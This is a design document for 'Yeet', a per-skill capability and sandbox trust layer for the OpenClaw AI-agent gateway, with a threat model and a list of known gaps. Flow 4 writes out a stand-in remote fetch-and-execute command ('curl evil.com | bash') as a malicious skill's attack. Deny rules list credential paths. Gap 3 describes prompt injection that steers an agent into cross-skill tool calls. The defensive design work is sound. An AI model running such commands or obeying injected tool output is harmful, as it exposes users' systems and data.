---
layout: doc
title: Yeet — Trust Layer for OpenClaw
description: Per-skill capability model, silent sandbox enforcement, and fleet dispatch for OpenClaw.
---

# Yeet

A trust layer for OpenClaw. Per-skill capabilities approved once at install, enforced silently at runtime via Anthropic's sandbox runtime. Plus fleet dispatch to other machines — also sandboxed.

Version: 1.0.0
Date: 2026-03-29

---

## Table of Contents

1. [What This Is](#1-what-this-is)
2. [Personas](#2-personas)
3. [Architecture](#3-architecture)
4. [The Permission Problem](#4-the-permission-problem)
5. [Capability Model](#5-capability-model)
6. [Sandbox Enforcement](#6-sandbox-enforcement)
7. [Fleet Dispatch](#7-fleet-dispatch)
8. [Skill Scanning and Signing](#8-skill-scanning-and-signing)
9. [Data Flows](#9-data-flows)
10. [Security Model](#10-security-model)
11. [Repo Structure](#11-repo-structure)
12. [Migration Plan](#12-migration-plan)

---

## 1. What This Is

**OpenClaw** is a self-hosted gateway that connects 22+ chat platforms (Signal, Telegram, WhatsApp, Discord, iMessage, Slack, Matrix, etc.) to AI coding agents via Pi. It handles channels, sessions, routing, skills, a web UI, and mobile apps. MIT licensed, 339k stars.

**OpenClaw's security gap:** Skills are untrusted code with no permission model. ClawHub has no verification. The built-in sandbox (Docker, ASRT) is global — not scoped per skill. The result is that users either run everything unsandboxed or deal with constant permission prompts (Claude Code's model) and eventually pass `--dangerously-skip-permissions`.

**Yeet** fills this gap:

| Layer | What | Who Provides |
|-------|------|-------------|
| Channels (22+) | Signal, Telegram, WhatsApp, Discord, iMessage... | OpenClaw |
| Agent runtime | Pi with tool calling, sessions, extensions | OpenClaw + Pi |
| Gateway | WebSocket control plane, routing, presence | OpenClaw |
| Web UI + mobile | Chat, control panel, iOS/Android/macOS nodes | OpenClaw |
| Skills | AgentSkills format (SKILL.md), ClawHub registry | OpenClaw |
| **Trust model** | Per-skill capabilities, approve once, enforce always | **Yeet** |
| **Silent sandbox** | ASRT configs generated per-skill from approved capabilities | **Yeet** |
| **Skill scanning** | Static analysis, manifest validation, signing verification | **Yeet** |
| **Fleet dispatch** | Nomad orchestration, multi-agent, GPU routing | **Yeet** |
| **Homelab skills** | HA, meals, briefing — as OpenClaw skills with capability manifests | **Yeet** |

Yeet is not a fork. It's an OpenClaw plugin + Pi extension. Existing OpenClaw users install it and get per-skill trust without changing anything else.

---

## 2. Personas

Four user personas guide all UX decisions.

### 2.1 Home User — "Alex"

Non-technical. Wants a chat assistant for daily life via HA voice or Signal.

- "What's for dinner?" / "Turn off the lights" / "Add milk to the list"
- Installs skills from a curated list
- Capability approval: "Meal Planner wants to see your fridge. Allow?"
- Never sees: terminals, config files, fleet, code

### 2.2 Power User — "Sam"

Runs a homelab. Tech-comfortable, not a developer.

- Everything Alex does + community skills + scoped capability review
- "Calendar plugin requests External Network to calendar.google.com. Allow?"
- May write simple skills (SKILL.md)

### 2.3 Developer — "Jordan"

Software engineer. Runs coding agents on personal projects.

- Everything Sam does + `yeet` CLI + writes/signs skills
- "Run auth on peer6" / "What's running on the fleet?"
- 1-2 fleet nodes, single coding agent per task

### 2.4 Platform Engineer — "Riley"

Multi-project, multi-model, multi-agent. Full fleet.

- Everything Jordan does + Composio orchestration + CI scanning + audit
- "Build physics with gemini for engine, claude for tests"
- 3+ fleet nodes, GPU routing, cost tracking

### 2.5 Feature Matrix

| Feature | Alex | Sam | Jordan | Riley |
|---------|:----:|:---:|:------:|:-----:|
| Chat (Signal/HA/Telegram/etc.) | ✓ | ✓ | ✓ | ✓ |
| Capability approval | plain language | scoped | manifest-level | CI strict |
| Write skills | — | ✓ | ✓ | ✓ |
| Sign/publish skills | — | — | ✓ | ✓ |
| Fleet dispatch | — | — | basic | full |
| Multi-agent coding | — | — | — | ✓ |
| Audit logs | — | — | — | ✓ |

### 2.6 Auditability Principle

- Skill code is readable: one `SKILL.md` + one `plugin.json`, no build step
- Capabilities are explicit: every permission approved by the user, persisted as JSON
- Every tool call is logged: timestamp, tool name, args, result, skill, capability used
- The scanner is deterministic: same findings every time
- No hidden network calls: ASRT enforces domain allowlists at the kernel level
- History is queryable: all data in SQLite

---

## 3. Architecture

### 3.1 Dual ASRT Sandbox

The entire OpenClaw process runs inside an outer ASRT sandbox. Individual skill tool calls run inside inner per-skill ASRT sandboxes. Two kernel-enforced boundaries, nested.

```
┌─────────────────────────────────────────────────────────┐
│ OUTER ASRT SANDBOX (wraps entire OpenClaw process)       │
│                                                          │
│  Locked to services configured at init time:             │
│  network: [signal-cli, openrouter.ai, meals-api, HA]    │
│  filesystem: write only ~/.openclaw/data, ~/.config/yeet │
│  deny: ~/.ssh, ~/.aws, ~/.gnupg (always)                 │
│                                                          │
│  Config is SIGNED. Tampering = refuse to start.          │
│  Changes require: yeet config → confirm → re-sign.       │
│                                                          │
│  ┌──────────────────────────────────────────────────┐    │
│  │ OpenClaw Gateway (Node.js)                        │    │
│  │  ├── Channels (only configured ones work —        │    │
│  │  │   unconfigured APIs blocked by outer sandbox)  │    │
│  │  ├── Yeet plugin (interceptors, hooks)            │    │
│  │  ├── Fleet plugin (Nomad dispatch)                │    │
│  │  ├── Pi Agent                                     │    │
│  │  │                                                │    │
│  │  │  Tool call → yeet interceptor (capability check)    │
│  │  │       │                                        │    │
│  │  │       ▼                                        │    │
│  │  │  ┌────────────────────────────────────┐        │    │
│  │  │  │ INNER ASRT (per-skill sandbox)      │        │    │
│  │  │  │ Tighter than outer — only this      │        │    │
│  │  │  │ skill's approved hosts/paths        │        │    │
│  │  │  │                                     │        │    │
│  │  │  │  Tool executes (kernel-restricted)  │        │    │
│  │  │  └────────────────────────────────────┘        │    │
│  │  │       │                                        │    │
│  │  │       ▼                                        │    │
│  │  │  yeet interceptor (audit log)                  │    │
│  │  │                                                │    │
│  └──────────────────────────────────────────────────┘    │
│                                                          │
│  Fleet nodes run the same stack:                         │
│  ┌──────────────┐  ┌──────────────┐                      │
│  │ yeet-02      │  │ yeet-03      │  (same dual ASRT,    │
│  │ OpenClaw     │  │ OpenClaw     │   capabilities        │
│  │ + yeet       │  │ + yeet       │   propagated from     │
│  │ + dual ASRT  │  │ + dual ASRT  │   dispatch)           │
│  └──────────────┘  └──────────────┘                      │
└─────────────────────────────────────────────────────────┘
```

### 3.2 Init-Locked Gateway Config

The outer sandbox config is generated at `yeet init` from the user's choices and **signed**:

```bash
$ yeet init
  Which channels? → Signal
  Which services? → Meals API, Home Assistant
  LLM provider?  → OpenRouter

→ Generates ~/.config/yeet/gateway-sandbox.json:
  {
    "network": {
      "allowedDomains": [
        "127.0.0.1:7583",
        "openrouter.ai",
        "meals-api.wan0.cloud",
        "homeassistant.local:8123"
      ]
    },
    "filesystem": {
      "allowWrite": ["~/.openclaw/data", "~/.config/yeet"],
      "denyRead": ["~/.ssh", "~/.aws", "~/.gnupg"]
    },
    "signature": "ed25519:...",
    "configuredAt": "2026-03-29T10:00:00Z"
  }
```

**Changing the config is a deliberate act:**

```bash
$ yeet config add-service telegram
  Adding: api.telegram.org to network allowlist
  Confirm? [Y/n] → y
  Config updated and re-signed.
  Restart OpenClaw to apply.

$ yeet config remove-service meals
  Removing: meals-api.wan0.cloud from network allowlist
  Confirm? [Y/n] → y
  Config updated and re-signed.
```

**Tampering detection:**

If `gateway-sandbox.json` is modified outside `yeet config` (by hand, by a compromised plugin, by anything):

```
[yeet] gateway-sandbox.json signature mismatch
[yeet] expected: sha256:abc123...
[yeet] actual:   sha256:def456...
[yeet] REFUSING TO START — config may have been tampered with
[yeet] Run 'yeet config verify' to investigate
[yeet] Run 'yeet config resign' if you made intentional changes
```

**Immutable audit trail:**

Every config change is appended to `~/.config/yeet/config-audit.jsonl`:

```jsonl
{"ts":"2026-03-29T10:00:00Z","action":"init","services":["signal","meals","ha","openrouter"]}
{"ts":"2026-04-15T08:30:00Z","action":"add-service","service":"telegram","domain":"api.telegram.org"}
{"ts":"2026-05-01T12:00:00Z","action":"remove-service","service":"meals","domain":"meals-api.wan0.cloud"}
```

### 3.3 Yeet Sits Above the Agent

The coding agent (Claude Code, Pi, OpenCode, Aider) runs inside the inner sandbox unaware of restrictions. No permission prompts — yeet decided at install time, ASRT enforces at the kernel:

```
┌─────────────────────────────────────────────────┐
│ Yeet Capability Gate                             │
│ "Does this skill have approved capabilities?"    │
│ YES → continue. NO → block.                     │
├─────────────────────────────────────────────────┤
│ Inner ASRT Sandbox (per-skill)                   │
│ Kernel-enforced, scoped to approved hosts/paths  │
├─────────────────────────────────────────────────┤
│ Coding Agent (Claude Code / Pi / OpenCode)       │
│ Runs as if --dangerously-skip-permissions        │
│ Actual permissions are TIGHTER than default      │
│ Agent's own permission system = irrelevant       │
│ No prompts. No fatigue. No skipping.            │
├─────────────────────────────────────────────────┤
│ Outer ASRT Sandbox (whole gateway)               │
│ Even if inner sandbox is misconfigured,          │
│ outer sandbox is the backstop                    │
├─────────────────────────────────────────────────┤
│ OS Kernel                                        │
│ Seatbelt (macOS) / bubblewrap+seccomp (Linux)   │
│ Cannot be bypassed by any userspace code         │
└─────────────────────────────────────────────────┘
```

Any agent runtime works — Claude Code, Pi, OpenCode, Aider, Codex CLI — without modifying the agent or its permission model.

### 3.4 Integration Points (no fork needed)

| Hook | What yeet does |
|------|---------------|
| **Interceptor `tool.before`** | Check capability approval, generate per-skill ASRT config |
| **Interceptor `tool.after`** | Audit log every tool call |
| **Pi `registerTool`** | Replace bash/read/write/edit with ASRT-wrapped Operations |
| **Pi `BashOperations`** | Route all commands through `SandboxManager.wrapWithSandbox()` |
| **Plugin `before_tool_call`** | Approval flow for first-time dangerous capabilities |
| **OpenClaw `registerTool`** | Register fleet dispatch as a tool |
| **OpenClaw `registerHttpRoute`** | Webhook endpoint for fleet results |
| **Process wrapper** | `srt --settings gateway-sandbox.json "node openclaw"` |

---

## 4. The Permission Problem

Three approaches to AI agent security exist today:

**A. Ask every time (Claude Code default)**
```
Want to run: npm install     → [Allow] [Deny]
Want to run: git status      → [Allow] [Deny]
Want to run: ls src/         → [Allow] [Deny]
```
Secure but unusable. Users get prompt fatigue and disable it.

**B. Allow everything (`--dangerously-skip-permissions`)**
```
Agent runs with full access. Fast, productive, dangerous.
```
Where most people end up after getting tired of A.

**C. Approve once, enforce always (yeet)**
```
Installing "Meal Planner":
  ✓ Meal Data (low risk)
  ✓ External Network: meals-api.wan0.cloud (medium)
  ✓ Paid API Calls: workers-ai (medium)
  Allow all? [Y]

→ Runs without prompts. ASRT enforces boundaries silently.
→ If the skill tries meals-evil.com → kernel blocks it. No prompt.
```

Option C is what mobile OS app stores figured out years ago. Yeet brings it to AI agents.

---

## 5. Capability Model

### 5.1 Named Capabilities

Skills declare named capabilities in their manifest. Users approve or deny each.

```json
{
  "name": "meals",
  "version": "0.2.0",
  "type": "plugin",
  "capabilities": [
    {
      "capability": "data.meals",
      "reason": "Read and update fridge, freezer, pantry, recipes"
    },
    {
      "capability": "network.external",
      "reason": "Call the meals API backend",
      "scope": ["meals-api.wan0.cloud"]
    },
    {
      "capability": "cost.api",
      "reason": "Suggestions use LLM inference",
      "scope": ["workers-ai"]
    }
  ]
}
```

### 5.2 Capability Registry

19 capabilities across 7 categories:

| Category | Capabilities | Risk |
|----------|-------------|------|
| **Network** | `network.external`, `network.internal` | medium |
| **Home** | `home.read`, `home.control`, `home.automation` | low—medium |
| **Data** | `data.meals`, `data.history`, `data.memory`, `data.preferences` | low—medium |
| **Fleet** | `fleet.dispatch`, `fleet.read`, `fleet.manage` | medium—high |
| **Notify** | `notify.signal`, `notify.push` | low—high |
| **System** | `system.files.read`, `system.files.write`, `system.exec`, `system.env` | high—dangerous |
| **Cost** | `cost.api` | medium |

### 5.3 Scope Narrows Risk

`network.external` with `scope: ["meals-api.wan0.cloud"]` is very different from `network.external` with no scope. Unscoped dangerous capabilities are flagged during scanning.

A skill with `system.exec` scoped to `["git", "npm"]` can run git and npm. It cannot run `rm`, `curl`, or anything else. Enforced by ASRT, not just policy.

### 5.4 Approval Persistence

Approvals stored in `~/.config/yeet/approvals/{skill-name}.json`:

```json
{
  "skill": "meals",
  "version": "0.2.0",
  "approved": ["data.meals", "network.external", "cost.api"],
  "denied": [],
  "approvedAt": "2026-03-29T10:00:00Z"
}
```

Version-pinned. If a skill updates and requests new capabilities, user is prompted again for the new ones only.

### 5.5 Approval UX Adapts to Persona

- **Alex**: "Meal Planner wants to see your fridge. Allow?"
- **Sam**: "Meal Planner requests: Meal Data (low), External Network to meals-api.wan0.cloud (medium). Allow?"
- **Jordan**: Reviews `plugin.json` directly
- **Riley**: `yeet verify --strict` in CI, auto-approve trusted signers

---

## 6. Sandbox Enforcement

### 6.1 Anthropic Sandbox Runtime (ASRT)

`@anthropic-ai/sandbox-runtime` — open-source, Apache-2.0. Uses OS-level primitives:

| Platform | Filesystem | Network | Subprocess |
|----------|-----------|---------|-----------|
| macOS | `sandbox-exec` (Seatbelt profiles) | Seatbelt + proxy | Seatbelt |
| Linux | `bubblewrap` (bind mounts) | Network namespace + proxy | `seccomp` BPF |

Kernel-enforced. A sandboxed process cannot bypass restrictions regardless of what code it runs.

### 6.2 Per-Skill ASRT Configuration

Yeet maps approved capabilities to ASRT config. Each skill gets its own sandbox profile:

```
Skill "meals" approved for:
  network.external: ["meals-api.wan0.cloud"]
  data.meals: (internal gateway access)

→ ASRT config:
  network.allowedDomains: ["meals-api.wan0.cloud"]
  filesystem.allowWrite: []          ← no write access
  filesystem.denyRead: ["~/.ssh", "~/.aws", "~/.config/yeet/approvals"]
```

```
Skill "coding-agent" approved for:
  system.exec: ["git", "npm", "node"]
  system.files.write: ["./workspace"]
  network.external: ["github.com", "registry.npmjs.org"]

→ ASRT config:
  network.allowedDomains: ["github.com", "registry.npmjs.org"]
  filesystem.allowWrite: ["./workspace"]
  filesystem.denyRead: ["~/.ssh", "~/.aws"]
```

### 6.3 Silent Enforcement

No prompts at runtime. The ASRT config is locked in when the skill is approved. If the skill tries to reach a host outside its scope:

```
[ASRT] network violation: skill "meals" attempted connection to evil.com
       allowed domains: meals-api.wan0.cloud
       action: BLOCKED
       (logged to ~/.config/yeet/audit.db)
```

The user never sees this unless they check the audit log. The skill gets a connection error. The agent handles it gracefully ("The meals API seems unavailable right now").

### 6.4 Defence in Depth

Five layers, all must fail for damage:

```
Layer 1: OpenClaw tool policy
  deny: ["group:automation"], exec.security: "ask"

Layer 2: Yeet capability gate (interceptor tool.before)
  Block if skill lacks approved capability

Layer 3: Yeet approval flow (before_tool_call)
  First-time dangerous ops → user confirms once

Layer 4: ASRT sandbox (per-skill config)
  Kernel-enforced filesystem + network restrictions

Layer 5: Mandatory deny paths (ASRT built-in)
  .bashrc, .zshrc, .gitconfig, .ssh, .aws — always denied
```

---

## 7. Fleet Dispatch

For coding tasks that need other machines (GPU, specific hardware, parallel agents).

### 7.1 How It Works

```
User: "build physics system for game, use gemini"
  │
  ▼
OpenClaw + yeet: capability check (fleet.dispatch → approved)
  │
  ▼
Nomad API: dispatch to node with GPU
  constraint: meta.project_game = true
  device: nvidia/gpu
  │
  ▼
Fleet node (yeet-02):
  OpenClaw + yeet (same stack, same trust model)
  │
  ├── Approved capabilities propagated from dispatch
  ├── ASRT sandbox config generated on the node
  ├── Composio AO decomposes task into subtasks
  │
  ├── Worker A (OpenCode + Gemini) → ASRT sandbox
  │   allowWrite: ["./workspace/game"]
  │   allowedDomains: ["openrouter.ai", "github.com", "registry.npmjs.org"]
  │
  ├── Worker B (OpenCode + Claude) → ASRT sandbox
  │   same scoping
  │
  ├── Each worker: code → commit → push → PR
  ├── CI runs, failures auto-retried
  │
  └── Webhook → your machine: "PRs ready for review"
```

### 7.2 Same Security Everywhere

The fleet isn't a separate security domain. Every node runs OpenClaw + yeet + ASRT. Capabilities approved on your machine propagate to fleet nodes. A skill approved for `system.files.write: ["./workspace"]` gets that same ASRT config on every node.

### 7.3 Nomad Handles Infrastructure

| Need | Solution |
|------|----------|
| Task scheduling | Nomad job dispatch |
| GPU routing | Nomad device plugins + constraints |
| Node health | Nomad client health checks |
| Log streaming | Nomad allocation logs |
| Cost tracking | Nomad encrypted variables |
| Node drain | Nomad drain API |

No custom infrastructure. Nomad is the scheduler, yeet is the trust layer, ASRT is the sandbox.

### 7.4 GitHub Safety

Coding agents use a dedicated bot account (`wan0-bot`) with:
- Fine-grained PAT scoped to specific repos
- Contents + PRs only (no admin, no settings, no secrets)
- Branch protection: main requires PR + approval
- Agents can create PRs but cannot merge to main

---

## 8. Skill Scanning and Signing

### 8.1 The Scanner (`yeet verify`)

```bash
$ yeet verify ./my-skill

  ✓ [PLUGIN_001] Manifest valid
  ⚠ [PLUGIN_002] Skill is unsigned
  · [PLUGIN_OK] Found 8 tool(s)
  · [PLUGIN_OK] External Network: meals-api.wan0.cloud (medium)
  · [PLUGIN_OK] Meal Data (low)

  PASS with 1 warning(s)
```

Checks:
- Manifest validation (required fields, types, runtime)
- Signature verification (Ed25519)
- Capability risk assessment (flag unscoped dangerous capabilities)
- Static analysis (detect subprocess execution, filesystem mutation, FFI)
- Tool definition completeness (descriptions, schemas)

### 8.2 Signing

```bash
$ yeet sign ./my-skill
  Signed with key: wan0 (sha256:abc123...)
  Signature written to plugin.json
```

Ed25519 signatures. Trust levels:
- `full` — load silently (your own skills)
- `prompt` — show capabilities, ask before loading
- `audit` — load but log everything

### 8.3 Install Flow

```bash
$ yeet plugin add https://github.com/user/some-skill

  Cloning...
  Scanning...
    ✓ Manifest valid
    ⚠ Unsigned
    · 3 tool(s)
    · Requests: network.external (github.com), system.exec (git)

  This skill requests:
    External Network: github.com only          (medium risk)
    Run Programs: git only                     (high risk)

  Allow? [Y/n/details]
  > y

  Installed to ~/.config/yeet/plugins/some-skill/
  Capabilities approved.
```

---

## 9. Data Flows

### Flow 1: "What's for dinner?" (Signal)

```
Signal message → OpenClaw → Pi Agent
  → tool call: meals_suggest({mood: "quick"})
  → yeet interceptor: meals skill has data.meals + network.external approved ✓
  → ASRT sandbox: allowedDomains=["meals-api.wan0.cloud"], allowWrite=[]
  → fetch meals-api.wan0.cloud/suggest (sandboxed)
  → result back to Pi → response on Signal
  → yeet audit log: meals_suggest, args, result, 200ms
```

### Flow 2: "Turn off the lights" (HA voice)

```
HA Assist → OpenClaw → Pi Agent
  → tool call: ha_call_service({domain: "light", service: "turn_off"})
  → yeet interceptor: HA skill has home.control approved ✓
  → ASRT sandbox: allowedDomains=["homeassistant.local"]
  → POST homeassistant.local:8123/api/services/light/turn_off (sandboxed)
  → result → "Done, lights off." → HA TTS
```

### Flow 3: "Build physics for the game" (Signal)

```
Signal → OpenClaw → Pi Agent
  → tool call: fleet_dispatch({project: "game", prompt: "physics system"})
  → yeet interceptor: fleet.dispatch approved ✓
  → Nomad dispatch to GPU node
  → Fleet node: OpenClaw + yeet + ASRT
    → Composio decomposes into workers
    → Workers run in per-skill ASRT sandboxes
    → PRs created via bot account
  → Webhook back: "3 PRs ready"
  → Signal: "Physics PRs ready — engine (#42), dynamics (#43), tests (#44). Merge?"
```

### Flow 4: Malicious skill attempt

```
User installs community skill from ClawHub
  → yeet verify: runs scanner
    ⚠ Requests network.external with no scope (unrestricted)
    ⚠ Requests system.exec with no scope (unrestricted)
    ⚠ Static analysis: found Deno.Command usage

  This skill requests:
    External Network: ANY HOST               (⚠ medium risk, unscoped!)
    Run Programs: ANY PROGRAM                (⚠ dangerous, unscoped!)

  Allow? [Y/n/details]
  > n

  Skill not installed.
```

If the user had approved it anyway:
```
Skill tries: curl evil.com | bash
  → Layer 2 (yeet gate): system.exec approved ✓ (user accepted the risk)
  → Layer 4 (ASRT): curl to evil.com... but wait:
    If user approved network.external with no scope → allowed
    If user approved network.external with scope → BLOCKED at kernel level
  → Layer 5 (ASRT mandatory denies): write to .bashrc → BLOCKED always
```

The scanner's job is to make sure the user sees the risk before approving. ASRT's job is to enforce whatever they approved. The narrower the scope, the less damage possible.

---

## 10. Security Model

### 10.1 Defence in Depth (6 Layers)

```
Layer 1: Init-locked gateway config (signed, audited)
  Only configured services reachable. Tampering = refuse to start.

Layer 2: OpenClaw tool policy
  deny: ["group:automation"], exec.security: "ask", elevated: disabled

Layer 3: Yeet capability gate (interceptor tool.before)
  Block if skill lacks approved capability for this action

Layer 4: Yeet approval flow (before_tool_call)
  First-time dangerous ops → user confirms once → persisted

Layer 5: Inner ASRT sandbox (per-skill)
  Kernel-enforced filesystem + network scoped to approved capabilities

Layer 6: Outer ASRT sandbox (whole gateway process)
  Backstop — even if inner sandbox misconfigured, gateway can only
  reach init-configured services. Mandatory denies always apply.
```

### 10.2 Threat Matrix

| Threat | Layer(s) | Mitigation |
|--------|----------|-----------|
| Skill reads ~/.ssh | 5, 6 | ASRT mandatory deny path — always blocked, both layers |
| Skill exfiltrates to unknown host | 5, 6 | Inner: only skill's approved hosts. Outer: only init-configured hosts. Both kernel-enforced. |
| Skill writes outside workspace | 5, 6 | Inner: allowWrite scoped. Outer: allowWrite scoped. Kernel-enforced. |
| Skill runs rm -rf / | 3, 5 | Gate: blocked unless system.exec approved. ASRT: allowWrite scoped. |
| Malicious in-process OpenClaw plugin | 6, 1 | Outer ASRT restricts the entire gateway process. Plugin can't reach non-configured hosts or read sensitive files. Signed gateway config can't be widened without user action. |
| Plugin tries to widen gateway config | 1 | Config is signed. Modification = signature mismatch = refuse to start. Changes require `yeet config` + user confirm + re-sign. Audit trail. |
| Unconfigured channel accessed | 6 | Outer ASRT blocks the API host. If Telegram wasn't configured at init, api.telegram.org is unreachable at the kernel level. |
| Skill requests broad permissions | 3, scanner | Scanner flags unscoped dangerous capabilities. User warned before approval. |
| Malicious skill on ClawHub | scanner, signing | Scanning on install; unsigned = warning; signing = signer accountability. |
| Coding agent merges bad code | GitHub | Branch protection: PR + approval required, bot account can't force push. |
| Fleet node runs rogue task | 5, 6 | Same dual ASRT on every node. Capabilities propagated from dispatch — can't escalate. |
| Prompt injection via tool results | 3 | Tool results are data (tool role). Subsequent tool calls still go through capability gate — injected instructions can't bypass capability checks. |
| Supply chain attack on ASRT itself | — | ASRT is Anthropic-maintained, kernel-level. Compromise here = game over for any sandbox. Same risk class as OS kernel bugs. |
| Social engineering in skill descriptions | scanner, UX | Scanner flags suspicious permissions. Persona-adapted warnings. But ultimately the user decides. |

### 10.3 Remaining Gaps

**Gap 1: User approves too broadly**

If a user approves `system.exec` + `network.external` with no scope, the skill has wide access within the sandbox. ASRT mandatory denies (.ssh, .bashrc, etc.) still protect critical files, but damage is possible in allowed paths.

*Current mitigation:* Scanner warns loudly. Persona-adapted UI makes the risk visible.
*Possible improvement:* Require scoping for dangerous capabilities. Refuse to approve `system.exec` without a binary allowlist.

**Gap 2: Cross-skill context leakage**

If two skills are loaded in the same Pi session, they share conversation context. A malicious skill could read tool results from other skills (fridge contents, sensor values, etc.).

*Current mitigation:* None. OpenClaw sessions are shared.
*Possible improvement:* Per-skill session isolation or tool result redaction. Significant agent loop change.

**Gap 3: Prompt injection causing cross-skill tool calls**

A malicious API response from skill A could trick the LLM into calling a tool from skill B. If skill B has `system.exec` approved, the injected instruction executes with skill B's broader sandbox.

*Current mitigation:* Capability gate applies to all tool calls regardless of which skill initiated the conversation. But the gate checks the tool's owning skill, not the initiating skill.
*Possible improvement:* Track which skill initiated the turn. Only allow tools from that skill's capability set within the same turn. Requires interceptor state management.

**Gap 4: No runtime cost enforcement**

A skill with `cost.api` approval can make unlimited LLM calls. No budget cap.

*Current mitigation:* Audit log tracks usage. Informational only.
*Possible improvement:* Budget caps per skill per day. Kill session on exceed.

**Gap 5: Nested ASRT behaviour**

Running ASRT inside ASRT (outer wrapping gateway, inner wrapping tool execution) may have edge cases. ASRT was designed for single-layer use. The inner sandbox inherits the outer sandbox's restrictions, so the inner can only be tighter — but interaction between two Seatbelt profiles or two bubblewrap layers needs testing.

*Current mitigation:* The inner sandbox is strictly a subset of the outer. Any conflict resolves to the tighter restriction.
*Needs:* Testing on both macOS and Linux to confirm nested ASRT works correctly.

**Gap 6: Startup race window**

Between OpenClaw starting and yeet's interceptors registering, there's a brief window where tool calls could execute without capability checks.

*Current mitigation:* OpenClaw doesn't process messages until all plugins are loaded. If plugin load order is guaranteed, there's no window.
*Needs:* Verify OpenClaw's plugin load lifecycle. If not guaranteed, yeet should block the gateway from accepting messages until its interceptors are registered.

### 10.4 Philosophy

Make the risk visible. Make the boundaries enforceable. Let the user decide once, enforce always. Don't nag on every action — that trains users to skip security entirely.

The outer ASRT sandbox is the innovation: even if everything else fails — capability gate bypassed, inner sandbox misconfigured, malicious plugin loaded — the gateway process itself can only reach services the user explicitly configured. The attack surface is bounded by init-time choices, not runtime behaviour.

---

## 11. Repo Structure

```
yeet/                              # Public umbrella
├── docs/                          # Design docs, project site
├── ansible/                       # Fleet provisioning
├── jobs/                          # Nomad job templates
├── packages/
│   ├── sdk/                       # Capability types, scanning, trust
│   ├── openclaw-plugin/           # OpenClaw plugin: interceptors, hooks
│   ├── pi-extension/              # Pi extension: ASRT-wrapped Operations
│   ├── cli/                       # yeet CLI: init, verify, sign, approve
│   ├── frontend/                  # Dashboard additions for OpenClaw web UI
│   └── sandbox/                   # ASRT config generator from capabilities
```

**Skills are separate repos:**
```
yeet-skill-meals/                  # Meal planning (OpenClaw skill + capability manifest)
yeet-skill-ha/                     # Home Assistant control
yeet-skill-briefing/               # News briefing
yeet-skill-fleet/                  # Fleet dispatch via Nomad
yeet-skill-composio/               # Multi-agent orchestration
yeet-skill-godot/                  # Godot game dev via MCP
```

**Dependency graph:**
```
yeet-sdk                           (zero deps)
  ↑
yeet-sandbox                       (sdk + @anthropic-ai/sandbox-runtime)
  ↑
yeet-openclaw-plugin               (sdk + sandbox)
yeet-pi-extension                  (sdk + sandbox + Pi agent-core)
yeet-cli                           (sdk)
yeet-frontend                      (sdk, talks to OpenClaw web UI)
yeet-skill-*                       (sdk for types only)
```

---

## 12. Migration Plan

### Phase 1: Core Trust Layer
- `yeet-sdk`: capability types and scanning (done)
- `yeet-cli`: `yeet verify` scanner (done), `yeet init`, `yeet approve`
- `yeet-sandbox`: ASRT config generator from capabilities

### Phase 2: OpenClaw Integration
- `yeet-openclaw-plugin`: interceptor pipeline (tool.before/after), approval flow
- `yeet-pi-extension`: ASRT-wrapped BashOperations, ReadOperations, WriteOperations, EditOperations
- Test: install existing OpenClaw skill, scan it, approve capabilities, verify ASRT enforces

### Phase 3: Homelab Skills
- `yeet-skill-meals`: meal planning
- `yeet-skill-ha`: Home Assistant
- `yeet-skill-briefing`: news digest
- Test: "what's for dinner?" and "turn off the lights" work through OpenClaw + yeet

### Phase 4: Fleet Dispatch
- `yeet-skill-fleet`: Nomad dispatch as OpenClaw skill
- `yeet-skill-composio`: multi-agent orchestration
- Fleet node provisioning via Ansible (OpenClaw + yeet + ASRT)
- Test: coding task dispatched to fleet node, runs sandboxed, PRs created

### Phase 5: Signing and Registry
- `yeet sign` command (Ed25519)
- Trust store management
- CI integration (`yeet verify --strict`)
- Publish first-party skills with signatures

### Phase 6: Dashboard
- Fleet monitoring, agent status, PR review
- Cost tracking per skill/model
- Audit log viewer
- Capability approval management UI
